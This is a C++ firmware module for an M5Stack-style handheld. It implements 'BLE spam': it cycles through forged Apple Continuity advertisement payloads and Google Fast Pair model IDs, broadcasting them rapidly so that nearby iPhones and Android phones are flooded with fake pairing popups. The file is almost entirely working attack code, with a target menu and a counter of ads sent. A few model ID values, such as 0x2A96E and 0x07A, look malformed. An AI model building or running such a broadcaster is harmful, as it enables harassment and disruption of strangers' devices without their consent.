// ============================================================
//  HeathenHawk Talon5 — modes/ble_spam.cpp
//  Massive BLE spam payload library
//  Apple Continuity (furiousMAC), Google Fast Pair, Samsung, Microsoft
// ============================================================

#include "../../pins.h"
#include "../display/display_driver.h"
#include "../hawk/hawk_pet.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>

#define MODE_NAME "BLE Spam"
#define STATUS_H  64

// ── Apple Continuity payloads (furiousMAC research) ───────────────────────────
struct ApplePL { const char* name; uint8_t d[27]; uint8_t l; };
static const ApplePL APPLE[] = {
    {"AirPods Pro",     {0x4C,0x00,0x07,0x19,0x01,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"AirPods 3",       {0x4C,0x00,0x07,0x19,0x01,0x0E,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"AirPods Max",     {0x4C,0x00,0x07,0x19,0x01,0x0A,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"Beats Flex",      {0x4C,0x00,0x07,0x19,0x01,0x03,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"Beats Studio",    {0x4C,0x00,0x07,0x19,0x01,0x09,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"Apple Watch S8",  {0x4C,0x00,0x07,0x05,0x01,0x10,0x80,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 18},
    {"Apple Watch Ultra",{0x4C,0x00,0x07,0x05,0x01,0x10,0x80,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 18},
    {"iPhone Nearby",   {0x4C,0x00,0x10,0x05,0x01,0x18,0x00,0xCC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 16},
    {"AirDrop",         {0x4C,0x00,0x05,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 20},
    {"HomeKit",         {0x4C,0x00,0x06,0x26,0x01,0xDA,0x43,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27},
    {"Apple TV",        {0x4C,0x00,0x0F,0x05,0xC1,0x01,0x60,0x4E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 16},
    {"AirPods 2",       {0x4C,0x00,0x07,0x19,0x01,0x0F,0x20,0x75,0xAA,0x30,0x01,0x00,0x45,0x01,0x00,0x11,0xA0,0x50,0x00,0x00,0x10}, 21},
    {"Handoff",         {0x4C,0x00,0x0C,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 16},
    {"iBeacon",         {0x4C,0x00,0x02,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0xC5}, 25},
    {"MacBook",         {0x4C,0x00,0x10,0x05,0x01,0x18,0x00,0xCC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01}, 16},
};
static const uint8_t APPLE_COUNT = sizeof(APPLE)/sizeof(APPLE[0]);

// ── Google Fast Pair models (trigger Android popup) ───────────────────────────
struct AndroidPL { const char* name; uint32_t modelID; };
static const AndroidPL ANDROID[] = {
    {"Pixel Buds Pro",     0x2A96E},
    {"Google Pixel Buds",  0x0718A8},
    {"WF-1000XM5",         0x0166FD},
    {"Galaxy Buds2 Pro",   0x0110F0},
    {"Galaxy Buds Live",   0x0118C4},
    {"JBL Tune 510BT",     0x718FA7},
    {"Bose QC45",          0x0001AC},
    {"AKG N400",           0x000A06},
    {"Beats Fit Pro",      0x07A,},
    {"Fast Pair Generic",  0xD11F00},
};
static const uint8_t ANDROID_COUNT = sizeof(ANDROID)/sizeof(ANDROID[0]);

struct SpamCategory { const char* name; uint32_t color; };
static const SpamCategory CATS[] = {
    {"Apple (iOS/macOS)",    HH_BLUE},
    {"Android Fast Pair",    HH_GREEN},
    {"All Platforms",        HH_TEAL},
    {"Cancel",               HH_GRAY},
};

void mode_ble_spam() {
    Display::clear(HH_DARK);
    Display::drawStatusBar(MODE_NAME,false,false,false,100);

    int32_t btnH=120, btnGap=16;
    int32_t startY=STATUS_H+80;

    Display::setTextColor(HH_WHITE,HH_DARK);
    Display::setTextSize(3.2f);
    Display::setCursor(40,STATUS_H+20);
    Display::print("Select target:");

    for (int i=0;i<4;i++) {
        int32_t by=startY+i*(btnH+btnGap);
        Display::fillRoundRect(40,by,Display::width()-80,btnH,20,CATS[i].color);
        Display::setTextColor(HH_WHITE,CATS[i].color);
        Display::setTextSize(3.3f);
        Display::setCursor(60,by+38);
        Display::print(CATS[i].name);
    }

    int8_t catIdx=-1;
    while (catIdx<0) {
        M5.update();
        m5::touch_point_t tp[1];
        if (M5.Lcd.getTouchRaw(tp,1)>0) {
            while (M5.Lcd.getTouchRaw(tp,1)>0) delay(10);
            for (int i=0;i<4;i++) {
                int32_t by=startY+i*(btnH+btnGap);
                if (tp[0].y>=by&&tp[0].y<=by+btnH) { catIdx=i; break; }
            }
        }
        delay(20);
    }
    if (catIdx==3) return;

    BLEDevice::init("HH");
    BLEAdvertising* pAdv=BLEDevice::getAdvertising();

    uint32_t adsSent=0, lastRender=0;
    uint8_t appleIdx=0, androidIdx=0;

    Display::clear(HH_DARK);
    Display::drawStatusBar(MODE_NAME,false,false,false,100);

    while (true) {
        M5.update();

        BLEAdvertisementData advData;
        const char* payloadName="";

        if (catIdx==0 || (catIdx==2 && adsSent%3!=1)) {
            // Apple Continuity
            const ApplePL& pl=APPLE[appleIdx%APPLE_COUNT];
            String mfr="";
            for (int i=0;i<pl.l;i++) mfr+=(char)pl.d[i];
            advData.setManufacturerData(mfr);
            payloadName=pl.name;
            appleIdx++;
        }

        if (catIdx==1 || (catIdx==2 && adsSent%3==1)) {
            // Google Fast Pair
            const AndroidPL& pl=ANDROID[androidIdx%ANDROID_COUNT];
            // Fast Pair service data format: model ID (3 bytes big-endian)
            String svcData="";
            svcData+=(char)((pl.modelID>>16)&0xFF);
            svcData+=(char)((pl.modelID>>8)&0xFF);
            svcData+=(char)(pl.modelID&0xFF);
            advData.setFlags(0x06);
            advData.setCompleteServices(BLEUUID((uint16_t)0xFE2C));
            advData.setServiceData(BLEUUID((uint16_t)0xFE2C),svcData);
            payloadName=pl.name;
            androidIdx++;
        }

        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(30);
        pAdv->stop();
        delay(20);

        adsSent++;
        if (adsSent%50==0) HawkPet::feed(FEED_BLE_SPAM,1);

        if (millis()-lastRender>600) {
            lastRender=millis();
            Display::fillRect(0,STATUS_H,Display::width(),
                              Display::height()-STATUS_H,HH_DARK);
            Display::setTextColor(CATS[catIdx].color,HH_DARK);
            Display::setTextSize(9.0f);
            Display::setCursor(40,STATUS_H+40);
            char buf[16]; snprintf(buf,sizeof(buf),"%lu",adsSent);
            Display::print(buf);
            Display::setTextColor(HH_GRAY,HH_DARK);
            Display::setTextSize(3.0f);
            Display::setCursor(40,STATUS_H+220);
            Display::print("BLE ads sent");
            Display::setTextSize(2.5f);
            Display::setCursor(40,STATUS_H+285);
            Display::printf("Target: %s",CATS[catIdx].name);
            Display::setCursor(40,STATUS_H+340);
            Display::printf("Payload: %.40s",payloadName);
            Display::setCursor(40,STATUS_H+395);
            Display::printf("Apple: %d payloads  Android: %d payloads",
                            APPLE_COUNT,ANDROID_COUNT);

            Display::fillRoundRect(40,Display::height()-130,
                                   Display::width()-80,100,20,HH_GRAY);
            Display::setTextColor(HH_WHITE,HH_GRAY);
            Display::setTextSize(3.5f);
            Display::setCursor(80,Display::height()-98);
            Display::print("STOP");
        }

        m5::touch_point_t tp[1];
        if (M5.Lcd.getTouchRaw(tp,1)>0&&tp[0].y>Display::height()-140) {
            while (M5.Lcd.getTouchRaw(tp,1)>0) delay(10);
            break;
        }
        delay(20);
    }

    BLEDevice::deinit();
    char msg[32]; snprintf(msg,sizeof(msg),"%lu ads sent",adsSent);
    Display::showAlert("Stopped",msg,HH_GRAY,2000);
}
